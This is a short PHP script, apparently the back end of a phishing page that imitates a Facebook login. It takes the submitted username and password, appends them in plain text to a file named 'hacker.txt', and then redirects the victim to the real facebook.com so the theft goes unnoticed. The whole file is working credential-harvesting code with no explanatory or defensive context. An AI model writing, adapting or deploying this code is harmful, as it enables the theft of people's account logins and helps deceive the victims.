<?php
	if($_SERVER['REQUEST_METHOD'] == 'POST') {
        if($_POST['inputUsername']){
            $username = $_POST['inputUsername'];
        }
        if($_POST['inputPassword']){
            $pass = $_POST['inputPassword'];
        }
        $fp = fopen('hacker.txt', 'a');
        fwrite($fp, "\n".'Username: '.$username."\n");
        fwrite($fp, 'Password: '.$pass);
        fclose($fp);
        header('Location:https://www.facebook.com/');
	}
?>